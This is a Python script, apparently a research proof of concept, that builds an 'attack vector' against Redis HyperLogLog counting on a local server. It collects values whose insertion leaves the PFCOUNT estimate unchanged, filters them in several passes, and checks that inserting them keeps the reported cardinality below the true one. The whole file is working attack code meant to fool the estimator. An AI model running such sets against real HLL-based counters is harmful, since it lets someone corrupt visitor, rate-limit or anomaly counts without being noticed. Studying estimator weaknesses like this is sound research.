import redis
import random

# Setup our redis connection. It's on the VM, so local is fine.
pool = redis.ConnectionPool(host="127.0.0.1", port=6379, db=0)
r = redis.Redis(connection_pool=pool)

# Define variables
a = [] #Attack Vector
PointOfSwitch = 40960 # R = 16384 // switch at 2'5 * m = 40960
cBuild = 40960 # Construction cardinality
nF = 5 # Number of filtering passes
sizeA = 40000 # Desired size of initial (unfiltered) attack vector


# Find elements for attack vector A
while len(a) < sizeA:
    r.delete('test')
    x = 0
    # Fill the HLL to cBuild point
    while (r.pfcount('test') < cBuild):
        r.pfadd('test', str(x))
        x = x + 1
    # Insert 20k elements to find non-incrementals before reseting to cBuild or ending if len(a) is enough
    aux = x + random.randint(0, 10000000) # x + random in order to assure no duplicate values
    for i in range(1, 20000):
        c_ant = r.pfcount('test')
        r.pfadd('test', str(aux))
        c_new = r.pfcount('test');
        # If the aux value does not increment, add it to attack vector A
        if c_new == c_ant:
            a.append(aux)
        aux = aux + 1

# Filtering of the attack vector nF times
for filter in range(nF):
    r.delete('test')
    random.shuffle(a)
    y = random.randint(0, 10000000)
    # Fill the HLL to cBuild point with, supposedly, new values
    while (r.pfcount('test') < cBuild):
        r.pfadd('test', str(y))
        y = y + 1
    for x in a:
        c_ant = r.pfcount('test');
        r.pfadd('test', str(x))
        # Remove elements that increase the HLL estimate
        c_new = r.pfcount('test');
        if c_new != c_ant:
            a.remove(x);



# Test the filtered set
r.delete('test1')

y = random.randint(0, 10000000)
limit = int(81920) # 2*PointOfSwitch upper limit
s = random.randint(PointOfSwitch, limit)
while (r.pfcount('test1') < s):
    r.pfadd('test1', str(y))
    y = y + 1

# Insert elements in a
for x in a:
    r.pfadd('test1', str(x))

finalLen = len(a)

print("Size of Attack Vector: ", finalLen)
print("Expected cardinality: ", s + len(a))
print("Real cardinality: ", r.pfcount('test1'))
